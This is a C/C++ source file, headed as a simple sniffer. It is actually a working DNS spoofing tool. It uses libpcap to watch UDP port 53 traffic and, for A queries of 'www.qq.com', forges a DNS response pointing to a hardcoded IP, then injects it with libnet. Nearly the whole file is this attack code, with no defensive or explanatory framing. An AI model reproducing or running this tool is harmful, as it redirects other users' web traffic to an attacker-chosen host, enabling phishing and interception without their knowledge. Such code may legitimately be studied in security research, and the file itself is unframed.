/* Simple TCP sniffer
 * To compile: gcc udpsniffer.c -o udppsniffer -lpcap
 * Run as root!
 * */
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h> /* includes net/ethernet.h */
#include <linux/ip.h>
#include <linux/udp.h>
#include <libnet.h>
#include <string>
#include <vector>
#include <iostream>
#include "dns_header.h"
#include "sendudpresp.h"

using std::string;
using std::vector;
using std::cout;
using std::endl;

void build_dns4_resp(uint8_t *dns_query, int query_len, 
		uint8_t *dns_answer, int answer_len, uint8_t *buffer, int *buffer_len);
vector<uint8_t> build_dns4_answer(int ttl, uint32_t addr);

#define MAXBYTES2CAPTURE 2048
int main(int argc, char *argv[])
{
	int i=0;
	bpf_u_int32 netaddr=0, mask=0;
	struct bpf_program filter;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *descr = NULL;
	struct pcap_pkthdr *pkthdr;
	const unsigned char *packet = NULL;
	struct ether_header *eptr = NULL;  /* net/ethernet.h */
	struct iphdr *ipptr = NULL;
	struct udphdr *udpptr = NULL;
	struct Dns_header *dnsptr = NULL;
	memset(errbuf, 0, PCAP_ERRBUF_SIZE);
	struct in_addr addr;
	libnet_t *send_descr;
	uint8_t dns_resp_buf[MAXBYTES2CAPTURE]; 
	int dns_resp_len;

	if (argc != 2){
		printf("Usage: ipsniffer <interface>\n");
		exit(1);
	}

#ifdef SEND_LOCAL
	// libnet dev open
	send_descr = libnet_init(
            LIBNET_RAW4,                            /* injection type */
            argv[1],                                /* network interface */
            errbuf);                                /* error buffer */
#else
	// libnet dev open
	send_descr = libnet_init(
            LIBNET_LINK,                            /* injection type */
            argv[1],                                /* network interface */
            errbuf);                                /* error buffer */
#endif

	// 伪造dns回答IP
	uint32_t dns_ans_ip = libnet_name2addr4(send_descr, "58.88.44.76", 0);

	vector<uint8_t> dns_answer = build_dns4_answer(5, dns_ans_ip);

	descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 0,
			512, errbuf);
	pcap_lookupnet(argv[1], &netaddr, &mask, errbuf);
	pcap_compile(descr, &filter, "udp and port 53", 1, mask);
	pcap_setfilter(descr, &filter);
	while (1){
		packet = NULL;
		int ret = pcap_next_ex(descr, &pkthdr, &packet);
		if (ret < 0) {
			printf("pcap_next_ex error: %s\n", pcap_geterr(descr));
			exit(1);
		}
		if (packet == NULL)
			continue;

		eptr = (struct ether_header *) packet;

		ipptr = (struct iphdr *)(packet + 14);

		udpptr = (struct udphdr *) (packet + 14 + ipptr->ihl*4);

		dnsptr = (struct Dns_header *) (packet + 14 + ipptr->ihl*4 + sizeof (udphdr));

		if (ntohs(dnsptr->flags) & (uint16_t)(0x8000)) {
		//	printf("not dns query packet!\n");
			continue;
		}

		if (ntohs(dnsptr->num_q) != 1) {
			printf("more than one question!\n");
			continue;
		}

		uint8_t *dns_body = (uint8_t *) (packet + 14 + ipptr->ihl*4 + 
				sizeof (udphdr) + sizeof (Dns_header));
		string name;
		uint16_t qtype, qclass;
		int dns_query_len = parser_dns_query(
				dns_body, (uint8_t *)(packet+pkthdr->caplen), 
				name, &qtype, &qclass);

		if (dns_query_len < 0) {
#ifndef NDEBUG
			printf("dns parser fault!\n");
#endif
			continue;
		}

		if (ntohs(qtype) != 1 || ntohs(qclass) != 1) {
#ifndef NDEBUG
			printf("only process A && IN query");
#endif
			continue;
		}

		if (name == "www.qq.com") {
			cout << "match " << name << endl;
			build_dns4_resp((uint8_t *) dnsptr, 
					sizeof (Dns_header) + dns_query_len, 
					&dns_answer[0], dns_answer.size(),
					dns_resp_buf, &dns_resp_len);
#ifdef SEND_LOCAL
			if (!send_udp_resp_raw(dns_resp_buf, dns_resp_len,
					udpptr, ipptr, send_descr)) {
				cout << "send_udp_resp fault!\n";
				exit(1);
			}
#else
			if (!send_udp_resp(dns_resp_buf, dns_resp_len,
					udpptr, ipptr, eptr, send_descr)) {
				cout << "send_udp_resp fault!\n";
				exit(1);
			}
#endif
		}

#ifndef NDEBUG
		printf("Received Packet Size: %d bytes\n", pkthdr->len);
		printf("Capture Packet Size: %d bytes\n", pkthdr->caplen);

		uint8_t *ptr = eptr->ether_dhost;
		i = ETHER_ADDR_LEN;
		printf("Destination Address:  ");
		do{
			printf("%s%x",(i == ETHER_ADDR_LEN) ? " " : ":",*ptr++);
		}while(--i>0);
		printf("\n");

		ptr = eptr->ether_shost;
		i = ETHER_ADDR_LEN;
		printf("Source Address:  ");
		do{
			printf("%s%x",(i == ETHER_ADDR_LEN) ? " " : ":",*ptr++);
		}while(--i>0);

		printf("\n");
		printf("the IP packets version: %d\n", ipptr->version); 
		printf ("the IP packets total_length is :%d\n", ntohs(ipptr->tot_len));
		printf ("the IP protocol is %d\n", ipptr->protocol);
		addr.s_addr = ipptr->daddr;
		printf ("Destination IP: %s\n", inet_ntoa(addr));    
		addr.s_addr = ipptr->saddr;
		printf ("Source IP: %s\n", inet_ntoa(addr));

		printf ("Destination port : %d\n", ntohs(udpptr->dest));
		printf ("Source port : %d\n", ntohs(udpptr->source));
		printf ("the len of udp packet is %u\n", ntohs(udpptr->len));

		printf ("the Dns transaction id: %x\n", ntohs(dnsptr->id));
		printf ("the Dns flags: %x\n", ntohs(dnsptr->flags));
		printf ("the Dns questions: %d\n", ntohs(dnsptr->num_q));
		printf ("the Dns Answer RRs: %d\n", ntohs(dnsptr->num_answ_rr));
		printf ("the Dns Authority RRs: %d\n", ntohs(dnsptr->num_auth_rr));
		printf ("the Dns Additional RRs: %d\n", ntohs(dnsptr->num_addi_rr));

		printf ("the Dns query: %s(%d)\n", name.c_str(), dns_query_len);
		printf ("the Dns query type: %x\n", ntohs(qtype));
		printf ("the Dns query class: %x\n", ntohs(qclass));
		cout << endl;
#endif

	}
	return 0;
}

/**
 *  Dns message
 *  reference: RFC 1035
 *
 *  +---------------------+
 *  |        Header       |
 *  +---------------------+
 *  |       Question      | the question for the name server
 *  +---------------------+
 *  |        Answer       | RRs answering the question
 *  +---------------------+
 *  |      Authority      | RRs pointing toward an authority
 *  +---------------------+
 *  |      Additional     | RRs holding additional information
 *  +---------------------+
 *
 *  all fields are network byte order
 */
/**
 *  Question section format
 *  reference: RFC 1035
 *
 *                                  1  1  1  1  1  1
 *    0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *  |                                               |
 *  /                     QNAME                     /
 *  /                                               /
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *  |                     QTYPE                     |
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *  |                     QCLASS                    |
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *
 *  all fields are network byte order
 */
void build_dns4_resp(uint8_t *dns_query, int query_len, 
		uint8_t *dns_answer, int answer_len, uint8_t *buffer, int *buffer_len)
{
	memcpy(buffer, dns_query, query_len);

	// fake dns header
	struct Dns_header *dnsptr = (struct Dns_header *) buffer;
	dnsptr->flags = htons((uint16_t) 0x8180);
	assert(ntohs(dnsptr->num_q) == 1);
	dnsptr->num_answ_rr = htons((uint16_t) 1);
	dnsptr->num_auth_rr = 0;
	dnsptr->num_addi_rr = 0;

	memcpy(buffer+query_len, dns_answer, answer_len);
	*buffer_len = query_len + answer_len;
}

/**
 *  Resource record format
 *  reference: RFC 1035
 *
 *                                  1  1  1  1  1  1
 *    0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *  |                                               |
 *  /                                               /
 *  /                      NAME                     /
 *  |                                               |
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *  |                      TYPE                     |
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *  |                     CLASS                     |
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *  |                      TTL                      |
 *  |                                               |
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *  |                   RDLENGTH                    |
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
 *  /                     RDATA                     /
 *  /                                               /
 *  +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
 *
 *  all fields are network byte order
 */
vector<uint8_t> build_dns4_answer(int ttl, uint32_t addr)
{
	vector<uint8_t> buffer;
	buffer.resize(16);	// answer RR size

	// fake dns answer
	uint8_t *ans_rr = &buffer[0];	// answer RR begin
	*(uint16_t *)(ans_rr) = htons((uint16_t) 0xc00c); // name
	*(uint16_t *)(ans_rr+2) = htons((uint16_t) 0x0001); // type
	*(uint16_t *)(ans_rr+4) = htons((uint16_t) 0x0001); // class
    *(uint32_t *)(ans_rr+6) = htonl((uint32_t) ttl);    // ttl
	*(uint16_t *)(ans_rr+10) = htons((uint16_t) 0x0004); // rdlength
	*(uint32_t *)(ans_rr+12) = addr; // addr
	return buffer;
}

